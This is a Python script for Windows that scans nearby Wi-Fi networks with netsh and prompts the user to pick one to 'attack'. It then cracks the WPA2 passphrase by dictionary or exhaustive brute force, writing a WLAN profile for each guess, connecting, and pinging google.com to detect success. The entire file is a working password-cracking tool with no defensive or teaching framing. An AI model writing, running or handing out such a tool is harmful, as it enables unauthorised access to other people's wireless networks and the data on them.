import os
from time import sleep
import subprocess
import itertools
from colorama import Fore
import re
xml_content = """<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>%s</name>
    <SSIDConfig>
        <SSID>
            <name>%s</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>%s</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
    <MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3">
        <enableRandomization>false</enableRandomization>
    </MacRandomization>
</WLANProfile>"""
def write_config(name,ssid,password):
    with open('connect.xml','w+') as f:
        f.write(xml_content % (name,ssid,password))
def show_available_wifis():
    av_wifi = subprocess.getoutput('netsh wlan show network')
    ssid_pattern = re.compile(r"\d : (.+)")
    ssid_matches = ssid_pattern.findall(av_wifi)
    for i in range(len(ssid_matches)):
        print(f"{i+ 1}- {ssid_matches[i]}")
    choose = int(input(Fore.RED + 'choose index of wifi do you want attack! -> '))
    try:
        if ssid_matches[choose - 1]:
            choice(ssid_matches[choose - 1])
    except IndexError:
        print(Fore.RED + 'invalid choice!')
        exit(0)
def brute_force_with_dictionary(name):
    ssid = name
    file_password = input('the name of pass_list: ')
    if os.path.isfile(file_password) == False:
        print('file doesn\'t exist!')
        exit(0)
    f = open(file_password)
    lines = f.readlines()
    for i in lines:
        password = i.strip()
        os.system('color a')
        write_config(name,ssid,password)
        subprocess.getoutput('netsh wlan add profile filename="connect.xml"')
        subprocess.getoutput(f'netsh wlan connect name="{name}"')
        print('wait for response! ')
        sleep(4)
        x = subprocess.getoutput('ping -n 1 google.com')
        sleep(2)
        if 'Reply from' in x:
            os.system('cls')
            print(Fore.RED +  f'the password is {password}')
            exit(0)

def brute_force_all_things(password,name,ssid):
    os.system('color a')
    write_config(name,ssid,password)
    subprocess.getoutput('netsh wlan add profile filename="connect.xml"')
    subprocess.getoutput(f'netsh wlan connect name="{name}"')
    print('wait for response! ')
    sleep(4)
    x = subprocess.getoutput('ping -n 1 google.com')
    sleep(2)
    if 'Reply from' in x:
        os.system('cls')
        print(Fore.RED +  f'the password is {password}')
        exit(0)
def generate_brute_force_list(name):
    characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&*()_+=-`[]\\\'";/.,|'
    ssid = name
    length = int(input('length for passwords: '))
    for combination in itertools.product(characters, repeat=length):
        password = ''.join(combination)
        print(password)
        brute_force_all_things(password,name,ssid)
def choice(name):
    print(Fore.YELLOW + '1- dictionary attack\n2- brute force attack')
    choice = input('select -> ')
    if choice == '1':
        brute_force_with_dictionary(name)
    elif choice == '2':
        generate_brute_force_list(name)
    else:
        print('invalid choice!')
        exit()
show_available_wifis()
